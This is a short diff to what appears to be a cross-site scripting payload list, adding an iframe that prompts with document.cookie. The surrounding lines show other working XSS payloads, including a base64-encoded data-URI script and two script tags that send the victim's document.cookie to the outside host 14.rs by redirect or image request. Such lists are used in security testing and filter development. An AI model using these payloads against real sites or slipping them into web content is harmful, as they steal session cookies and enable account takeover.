@@ -125,6 +125,7 @@ lert&#x000000028;origin&#x000029;>
 ><iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>
 <iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>
 <IFRAME SRC="javascript:alert(document.cookie);"></iframe>
+<IFRAME SRC="javascript:prompt(document.cookie);"></iframe>
 <script>document.location='http://14.rs?c='+document.cookie</script>
 <script>new Image().src="http://14.rs/cookie.php?c="+document.cookie</script>
 <script>document.body.background=”http://14.rs“;</script>
